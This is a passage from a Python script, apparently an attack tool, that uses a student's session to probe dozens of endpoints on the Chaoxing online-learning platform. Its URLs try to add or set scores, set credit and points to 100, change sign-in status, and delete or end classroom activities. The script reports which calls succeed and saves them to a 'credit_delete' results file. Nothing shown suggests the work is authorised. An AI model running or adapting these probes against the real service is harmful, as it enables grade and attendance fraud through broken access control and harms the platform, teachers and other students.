        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/addScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=5",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/giveScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=5",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/updateScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=5",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/setScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=5",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/modifyScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=5",
        # 课堂表现
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/classroomPerformance?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/performance?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 抢答/投票/选人
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/quiz?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/vote?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/pick?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 课堂活动列表
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/activeList?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/signList?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
    ]

    interaction_results = []
    for ep in interaction_endpoints:
        # 学生测试
        r = safe_get(s_session, ep, f"学生-{ep.split('/')[-1].split('?')[0]}")
        interaction_results.append(r)
        status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
        print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:80]}")

    results["interaction"] = interaction_results

    # =============================================
    # 第10部分: 尝试签到活动详情页获取更多信息
    # =============================================
    print("\n" + "=" * 80)
    print("第10部分: 签到活动详情页探索")
    print("=" * 80)

    if test_aid:
        # 签到活动详情页面
        sign_detail_urls = [
            f"https://mobilelearn.chaoxing.com/pptSign/signDetail?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
            f"https://mobilelearn.chaoxing.com/pptSign/stuSign?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
            f"https://mobilelearn.chaoxing.com/pptSign/signResult?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
            f"https://mobilelearn.chaoxing.com/pptSign/teacherSign?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
            f"https://mobilelearn.chaoxing.com/newsign/signDetail?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}&DB_STRATEGY={db_strategy}",
            f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/signDetail?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}&DB_STRATEGY={db_strategy}",
            f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/signInfo?activeId={test_aid}&DB_STRATEGY={db_strategy}",
            f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/activeInfo?activeId={test_aid}&DB_STRATEGY={db_strategy}",
            f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/getSignInfo?activeId={test_aid}&DB_STRATEGY={db_strategy}",
            f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/getActiveInfo?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        ]

        detail_results = []
        for url in sign_detail_urls:
            r = safe_get(s_session, url, f"学生-{url.split('/')[-1].split('?')[0]}")
            detail_results.append(r)
            status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
            print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:100]}")

        results["sign_detail"] = detail_results

    # =============================================
    # 第11部分: 尝试通过v2/apis路径
    # =============================================
    print("\n" + "=" * 80)
    print("第11部分: v2/apis路径探索")
    print("=" * 80)

    v2_endpoints = [
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/sign/delete?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/sign/end?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/sign/cancel?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/active/delete?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/active/end?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/credit/get?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/credit/update?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/credit/add?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/score/get?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/score/update?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=100",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/point/get?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/point/update?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&point=100",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/classroomCredit/get?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/classroomCredit/update?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        # 签到状态修改(类似updateSignStatus的模式)
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/sign/updateStatus?activeId={test_aid}&uid={s_puid}&status=1",
        f"https://mooc1-api.chaoxing.com/mooc-ans/v2/apis/sign/modifyStatus?activeId={test_aid}&uid={s_puid}&status=1",
    ]

    v2_results = []
    for ep in v2_endpoints:
        r = safe_get(s_session, ep, f"学生-{ep.split('/')[-1].split('?')[0]}")
        v2_results.append(r)
        status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
        print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:80]}")

    results["v2_endpoints"] = v2_results

    # =============================================
    # 汇总
    # =============================================
    print("\n" + "=" * 80)
    print("汇总结果")
    print("=" * 80)

    # 统计成功的端点
    success_endpoints = []
    all_result_lists = [newsign_results, active_api_results, credit_results,
                        post_results, domain_results, interaction_results, v2_results]

    for result_list in all_result_lists:
        for r in result_list:
            if r['status'] == 200 and r['len'] > 10:
                # 排除已知的无效响应
                text = r['text'].lower()
                if 'not found' not in text and 'error' not in text and '500' not in text:
                    success_endpoints.append(r)

    print(f"\n[*] 成功的端点数: {len(success_endpoints)}")
    for r in success_endpoints:
        print(f"  [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:100]}")

    print(f"\n[*] 从JS中提取到的API端点: {len(js_api_endpoints)}")
    for ep in js_api_endpoints:
        print(f"  {ep}")

    # 保存结果
    results["js_api_endpoints"] = list(js_api_endpoints)
    results["success_endpoints"] = [{"desc": r["desc"], "url": r["url"], "status": r["status"],
                                      "text": r["text"], "len": r["len"]} for r in success_endpoints]

    with open("/workspace/credit_delete_round5_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2, default=str)

    print(f"\n[*] 结果已保存到 /workspace/credit_delete_round5_results.json")

if __name__ == "__main__":
    main()
